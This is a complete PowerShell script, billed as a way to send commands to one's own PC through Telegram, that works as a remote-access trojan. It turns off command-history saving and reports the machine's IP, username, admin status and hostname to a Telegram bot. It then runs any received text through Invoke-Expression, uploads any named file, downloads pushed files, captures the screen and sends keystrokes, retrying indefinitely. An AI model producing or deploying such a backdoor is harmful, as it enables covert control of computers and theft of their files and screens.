
# Send PowerShell commands over the Internet to your PC via Telegram

Clear-Host

Set-PSReadlineOption    -HistorySaveStyle   SaveNothing
Set-Location            -Path               $env:USERPROFILE
Add-Type                -AssemblyName       System.Windows.Forms
Add-type                -AssemblyName       System.Drawing
 
$telegram_TOKEN             = "@TOKEN"  # your API Token    (without the "@")
$telegram_ID                = "@ID"     # your Telegram ID  (without the "@")
$api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates'               -f $telegram_TOKEN
$api_get_messages           = 'https://api.telegram.org/bot{0}/sendMessage'              -f $telegram_TOKEN
$api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id='         -f $telegram_TOKEN
$api_download_file          = 'https://api.telegram.org/file/bot{0}/'                    -f $telegram_TOKEN
$api_upload_file            = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $telegram_TOKEN, $telegram_ID
$cache_file                 = '{0}\ps_cache'                                             -f $env:LOCALAPPDATA
$wait                       =  1000
$Global:ProgressPreference  = 'SilentlyContinue'


function splitOutput ($output) 
{
    if ($output.Length -gt 4096) {
        Write-Host "Separation for every 4096 characters of the input output..."
    }

    $output_splitted        = $output -split ""
    $temp_part_of_output    = ""
    $array_of_output_parts  = @()
    $counter                = 0

    Write-Host "Working on it..."

    foreach ($char in $output_splitted) 
    {
        if ($counter -eq 4096) 
        {
            Write-Host "Creating a block..."
            $array_of_output_parts += $temp_part_of_output
            Write-Host "Block created..."
            $temp_part_of_output = ""
            $counter = 0
        }

        $temp_part_of_output += $char
        $counter += 1
    }
    
    Write-Host "Create the last block..."
    $array_of_output_parts += $temp_part_of_output
    
    Write-Host "The output is ready to be sent"
    return $array_of_output_parts
}


function takeAScreenShot ()
{
    sendMessage "Trying to use a .net function for make a screenshot..."
    try {
        sendMessage "Getting total screen width and height..."
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $width  = $screen.Width
        $height = $screen.Height
        $left   = $screen.Left
        $top    = $screen.Top
        
        sendMessage "Creating a bitmap object..."
        $bitmap = New-Object System.Drawing.Bitmap $width, $height

        sendMessage "Creating a graphics object..."
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)

        sendMessage "Performing a screen capture..."
        $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)

        sendMessage "Saving to file..."
        $bitmap.Save(($env:LOCALAPPDATA + "\Temp\ScreenShot.bmp"))
    }
    catch {
        sendMessage "Trying to send PRTSC keystroke..."
        try {
            sendMessage "Calling the .net function..."
            [void][reflection.assembly]::loadwithpartialname("system.windows.forms")
            sendMessage "Pressing the keystroke..."
            [system.windows.forms.sendkeys]::sendwait('{PRTSC}')
            sendMessage "Getting the clipboard data for saving it as a PNG..."
            Get-Clipboard -Format Image | ForEach-Object -MemberName Save -ArgumentList ($env:LOCALAPPDATA + "\Temp\screenshot.png")
        } catch {
            sendMessage $Error[0]
        }
    }

    sendMessage "Checking if the screenshot has been saved..."
    if (Test-Path ($env:LOCALAPPDATA + "\Temp\screenshot.*")) {
        sendMessage "File found, sending to Telegram..."
        sendDocument ($env:LOCALAPPDATA + "\Temp\ScreenShot.*")
        Remove-Item ($env:LOCALAPPDATA + "\Temp\screenshot.*")
    } else {
        sendMessage "File was not saved"
    }
}


function sendKeyStrokes ($key) 
{
    try {
        sendMessage "Calling the .net function..."
        [void][reflection.assembly]::loadwithpartialname("system.windows.forms")
        sendMessage "Pressing the keystroke..."
        [system.windows.forms.sendkeys]::sendwait('{{0}}' -f $key)
        sendMessage "Keystroke pressed"
    } catch {
        Write-Host $Error[0]
        sendMessage $Error[0]
    }
}


function checkAdminRights() 
{
    $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
    $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($elevated) {
        return ($env:USERNAME + " is an Administrator")
    } else {
        return ($env:USERNAME + " is not an Administrator")
    }
}


function downloadDocument ($file_id, $file_name) 
{
    sendMessage "Getting information about document..."
    $get_file_path = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id)
    sendMessage "File path received"
    $file_path = $get_file_path.result.file_path
    sendMessage "Downloading file..."
    Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name
    if (Test-Path -Path $file_name) {
        sendMessage "Downloaded"
    } else {
        sendMessage "File was not downloaded"
    }
}


function sendDocument ($file) 
{
    sendMessage "Sending the document..."
    if (Test-Path -Path $file) {
        try {
            curl.exe -F document=@"$file" $api_upload_file --insecure | Out-Null # Temporary solution (CURL.exe)
        }
        catch {
            sendMessage $Error[0]
        }
    } else {
        sendMessage "This file does not exists"
    }
}


function sendMessage ($output, $message_id) 
{
    Write-Host "Preparing for sending the output..."
    
    $MessageToSend = New-Object psobject
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id'                    -Value $telegram_ID
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'protect_content'            -Value $true
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'disable_web_page_preview'   -Value $false
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'parse_mode'                 -Value "html"
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'reply_to_message_id'        -Value $message_id
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text'                       -Value ("<pre>" + $output + "</pre>")
    $MessageToSend = $MessageToSend | ConvertTo-Json

    try {
        Write-Host "Send via API the message containing the output..."
        Invoke-RestMethod -Method Post -Uri $api_get_messages -Body $MessageToSend -ContentType "application/json" | Out-Null
        Write-Host "The message has been successfully sent"
    } catch {
        Write-Host -ForegroundColor RED -BackgroundColor Black $Error[0]
        $wait = $wait + 100
        Start-Sleep -Milliseconds $wait
    }
}


function commandListener 
{
    try {
        $_ip    = (Invoke-WebRequest -Uri "https://ident.me/").Content
        $_path  = (Get-Location).Path
        $_user  = checkAdminRights
        $_host  = $env:COMPUTERNAME
        $_body  = '{0} ({1}) - IP:{2} - [{3}]' -f $_host, $_user, $_ip, $_path
        sendMessage $_body
        while (Invoke-RestMethod -Method Get "api.telegram.org") 
        {
            $message    = Invoke-RestMethod -Method Get -Uri $api_get_updates
            $message    = $message.result.Message[-1]
            $message_id = $message.message_id
            $user_id    = $message.chat.id
            $text       = $message.text
            $document   = $message.document

            if ((Get-Content -Path $cache_file)[-1] -notmatch $message_id) {
                Write-Host ($telegram_ID + " of the verified message: " + $message_id)
                Add-Content -Path $cache_file -Value $message_id -Force
                if ($user_id -match $telegram_ID) {
                    Write-Host ("Username verified: " + $username)
                    if ($text -match "exit") {
                        Write-Host "Connection closure..."
                        exit
                    }

                    if (Test-Path -Path $text) {
                        sendDocument $text 
                    } elseif ($text.Length -gt 0) {
                        Write-Host "Received message: $text"
                        try {
                            $output = Invoke-Expression $text | Out-String
                        } catch {
                            $output = $Error[0] | Out-String
                        }
                        $output = splitOutput $output
                        foreach ($block in $output) {
                            $block = $block | Out-String
                            if ($block.Length -gt 2) {
                                sendMessage $block $message_id
                            } else {
                                sendMessage "No Output Data" $message_id
                            }
                        }
                        $wait = 1000
                    }
                    
                    if ($document) {
                        $file_id   = $document.file_id
                        $file_name = $document.$file_name
                        downloadDocument $file_id $file_name
                    }
                } 
                else {
                    sendMessage ("Unauthorized user found! " + $user_id)
                }
            }

            if ($wait -eq 15000) {
                $wait = 1000
            } else {
                $wait = $wait + 100
            }

            Start-Sleep -Milliseconds $wait
        }
    } catch {
        Write-Host $Error[0]

        while (-Not(tnc).PingSucceeded) { 
            Write-Host "Retrying in $wait milliseconds..."
            Start-Sleep -Milliseconds $wait
            $wait = $wait + 100
        }

        sendMessage $Error[0]
        commandListener
    }
}


if (-Not(Test-Path -Path $cache_file)) {
    Add-Content -Path $cache_file -Value "0" -Force
}


commandListener